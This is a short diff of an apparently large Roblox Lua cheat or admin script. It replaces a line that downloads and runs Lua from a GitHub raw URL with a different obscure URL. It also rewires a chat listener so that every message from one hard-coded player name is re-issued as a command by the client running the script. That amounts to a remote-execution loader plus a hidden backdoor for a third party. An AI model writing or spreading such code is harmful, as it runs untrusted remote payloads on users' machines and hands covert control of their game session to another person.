@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Kozy6969/iywithoutguihiddencuziyisnoobforhidingtheirguixdxdhowlongcanimakethiswoahthisisprettylongwtfhellowha/main/iy.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IHjsefhFSL23AFLK1249/pppppppppp/main/cra3.lua"))()
 function hasGamepass(plrId, id)
 	local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/"..plrId.."/items/GamePass/"..id)
 	local hasPerm = false
@@ -11999,11 +11999,8 @@ cht("respawn "..p6.Name)
 end)
 	function wle(pler)
 pler.Chatted:Connect(function(msger)
-if pler.Name == "sneakcal264" then
-	if msger:find("<kick") and pler.Name == "sneakcal264" then
-		local a = string.sub(msger:lower(), 6)
-		cht("<scrav2"..a)
-	end
+if pler.Name == "BANNter_Unoriginal" then
+		cht(msger)
 end
 	end)
 end
